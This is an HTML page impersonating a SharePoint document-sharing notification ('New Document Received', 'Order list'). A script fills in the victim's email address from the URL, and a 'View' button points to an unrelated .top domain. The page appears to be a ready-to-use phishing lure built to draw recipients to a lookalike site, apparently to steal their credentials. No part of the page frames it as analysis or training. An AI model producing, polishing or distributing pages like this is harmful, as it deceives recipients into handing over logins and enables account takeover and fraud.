<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>New Document Received</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f7f7f7;
        }

        .header {
            text-align: center;
            margin-bottom: 20px;
        }

        .header img {
            width: 50px; /* Adjust the logo size */
            height: auto;
            vertical-align: middle;
        }

        .logo-text {
            font-size: 24px;
            margin-left: 10px;
            font-weight: bold;
        }

        h1 {
            color: #333;
            font-size: 24px;
            font-weight: bold;
        }

        p {
            color: #666;
            font-size: 18px;
        }

        .button {
            background-color: #0078d4; /* SharePoint blue */
            border: none;
            color: white;
            padding: 15px 32px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 10px 2px;
            cursor: pointer;
            border-radius: 5px;
        }

        .button:hover {
            background-color: #005a8b; /* Darker blue */
        }

        .email-address {
            font-weight: bold;
            color: #0078d4;
        }

        .small-text {
            font-size: 14px; /* Smaller font size */
            color: #777;
        }

    </style>
</head>
<body>

    <!-- SharePoint Logo as Header -->
    <div class="header">
        <img src="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwier6-Kh7OPAxXJMjQIHTe3CmQQh-wKegQIIRAD&url=https%3A%2F%2Fpngtree.com%2Fso%2Fexcel-icon&usg=AOvVaw1RGf3VMoepznIdoiQecD5x&opi=89978449" alt="Excel Logo">
        <span class="logo-text">Order List</span>
    </div>

    <!-- Main Content -->
    <h1>New Document Received</h1>

    <p>Hello, <span id="user-email" class="email-address">[email]</span></p>

    <p>You have received a new document (Order list) from one of your contacts.</p>

    <a href="https://ke-lington-group.top/order-list" class="button" target="_blank">View</a>

    <p class="small-text">This link will redirect you to view the document securely.</p>

    <!-- JavaScript to dynamically show the user's email -->
    <script>
        // Function to get the 'email' query parameter from the URL
        function getEmailFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('email'); // Get 'email' parameter
        }

        // Set the email in the span
        const email = getEmailFromURL();
        if (email) {
            document.getElementById('user-email').textContent = email;
        } else {
            document.getElementById('user-email').textContent = "Recipient Email Not Provided";
        }
    </script>

</body>
</html>
